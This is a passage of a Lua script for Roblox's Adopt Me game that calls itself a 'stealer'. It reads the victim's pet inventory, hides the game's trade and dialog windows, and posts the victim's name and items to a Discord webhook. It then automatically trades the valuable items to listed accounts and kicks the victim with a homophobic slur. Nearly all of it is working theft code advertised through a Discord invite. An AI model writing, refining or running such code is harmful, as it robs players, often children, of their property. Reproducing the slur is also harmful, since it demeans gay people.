                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendMessage(sortedItems)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
	}

    local grouped = {}
    for _, item in ipairs(sortedItems) do
        local key = item.Name .. " " .. propertiesToString(item.Properties)
        if grouped[key] then
            grouped[key].Count = grouped[key].Count + 1
            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
        else
            grouped[key] = {
                Name = item.Name,
                Properties = item.Properties,
                Count = 1,
                TotalValue = item.Value
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\144\178 New Adopt Me Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do
                hashes[key] = value
            end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end

    if remote:IsA("RemoteFunction") then
        return remote:InvokeServer(...)
    elseif remote:IsA("RemoteEvent") then
        remote:FireServer(...)
    end
end

local data = hashedAPI("DataAPI/GetAllServerData")
if not data then
    plr:kick("Tampering detected. Please rejoin and re-execute without any other scripts")
    return
end

local excludedItems = {
    "spring_2025_minigame_scorching_kaijunior",
    "spring_2025_minigame_toxic_kaijunior",
    "spring_2025_minigame_spiked_kaijunior",
    "spring_2025_minigame_spotted_kaijunior"
}
local inventory = data[plr.Name].inventory

for category, list in pairs(inventory) do
    for uid, data in pairs(list) do
        local cat = InventoryDB[data.category]
        if cat and cat[data.id] then
            local value = getPetValue(cat[data.id].name, data.properties)
            if value and value >= min_value then
                if table.find(excludedItems, data.id) then
                    continue
                end
                table.insert(itemsToSend, {UID = uid, Name = cat[data.id].name, Properties = data.properties, Value = value})
                totalValue = totalValue + value
            end
        end
    end
end

tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeFrame.Visible then
        inTrade = true
    else
        inTrade = false
    end
end)

dialog:GetPropertyChangedSignal("Visible"):Connect(function()
    dialog.Visible = false
end)

toolApp:GetPropertyChangedSignal("Visible"):Connect(function()
    toolApp.Visible = true
end)

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.Value > b.Value
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendJoinMessage(itemsToSend, prefix)
    SettingsRemote:FireServer("trade_requests", 1)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            local tradeRequestSent = false
            if not inTrade and not tradeRequestSent then
                SendTrade:FireServer(game.Players[joinedUser])
                tradeRequestSent = true
            else
                for i = 1, math.min(18, #itemsToSend) do
                    local item = table.remove(itemsToSend, 1)
                    AddPetRemote:FireServer(item.UID)
                end
                repeat
                    AcceptNegotiationRemote:FireServer()
                    wait(0.1)
                    ConfirmTradeRemote:FireServer()
                until not inTrade
                tradeRequestSent = false
            end
            wait(1)
        end
        plr:kick("GET FUCKING JUGGED GAY FUCKING FAGGOT .gg/scriptloaders")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
